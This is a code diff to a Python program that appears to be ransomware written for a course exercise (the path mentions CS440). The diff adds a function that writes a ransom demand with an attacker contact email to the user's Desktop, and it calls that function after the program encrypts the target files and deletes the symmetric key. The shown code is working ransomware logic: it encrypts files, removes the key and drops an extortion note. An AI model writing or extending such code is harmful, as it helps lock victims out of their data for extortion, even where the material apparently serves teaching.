@@ -30,6 +30,29 @@ if (platform.system() == "Darwin" or platform.system() == "Linux"):
     user_os = platform.system()
     path_str = "/"
 
+def create_ransom_note():
+    # Define the ransom note content
+    ransom_note_content = """
+    Your files have been encrypted by ransomware.
+
+    To retrieve the decryption key and recover your files, you must pay a ransom.
+
+    Contact us at the following address to arrange payment and receive the decryption key:
+
+    Email: attacker@gmail.com
+
+    After payment, you will be provided with the decryption key to recover your files.
+    """
+
+    # Create the ransom note on the victim's desktop
+    ransom_note_path = str(pathlib.Path.home()) + '/Desktop/Test/CS440/README_FOR_DECRYPTION.txt'
+    try:
+        with open(ransom_note_path, "w") as ransom_note_file:
+            ransom_note_file.write(ransom_note_content)
+        print(f"Ransom note created at: {ransom_note_path}")
+    except Exception as e:
+        print(f"Failed to create ransom note: {e}")
+
 def has_onedrive():
     # Check common OneDrive paths
     local_onedrive_path = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "OneDrive")
@@ -150,6 +173,7 @@ def encrypt(target):
             with open(doc, "wb") as encrypted_file:
                 encrypted_file.write(cipher)
         
+        create_ransom_note()
         os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
     else:
         print("Target empty.")
